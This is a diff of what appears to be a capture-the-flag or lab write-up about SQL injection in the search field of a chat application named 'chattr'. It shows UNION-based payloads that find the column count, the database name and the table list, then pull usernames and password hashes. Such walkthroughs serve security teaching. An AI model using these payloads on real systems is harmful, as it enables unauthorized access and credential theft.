@@ -50,13 +50,13 @@ Explanation:
 
 ## Exploit:
 
-The "search in conversation" input field uses a GET request to retrieve messages in the database. This represents a potential injection point.
+The "search in conversation" input field uses a GET request to retrieve data from the database. This represents a potential injection point.
 
-Lets start by determine the number of columns we are working with
+- Lets start by determine the number of columns we are working with
 
-- We can do so with this injection:
+  - We can do so with this injection:
 
-      ') UNION SELECT 1,2,3,4-- -
+        ') UNION SELECT 1,2,3,4-- -
 
   - This allows us to break out of the original query with ')
   - Then the UNION SELECT aligns the columns
@@ -65,14 +65,26 @@ Lets start by determine the number of columns we are working with
 <img width="1282" height="445" alt="chattr1" src="https://github.com/user-attachments/assets/62606693-24af-4058-9f0b-a981d4dbd094" />
 
 
-Lets try a basic exploit to find the database name with this injection:
+- Lets try a basic exploit to find the database name with this injection:
 
-    ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #
+      ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #
 
-- This returns: chattr
+  - This returns: chattr
 
 <img width="1282" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/705aabe0-e1bc-4fee-acdd-471273234a79" />
 
+
+- Now lets enumerate the databases and tables, we can do that with:
+
+      ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES-- -
+
+  - This returns a long list of information but lets focus on 
+
+...
+
+- We can get the password hashes with:
+
+      ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -
 
 Next, lets see what permissions are avalible with the payload:
 
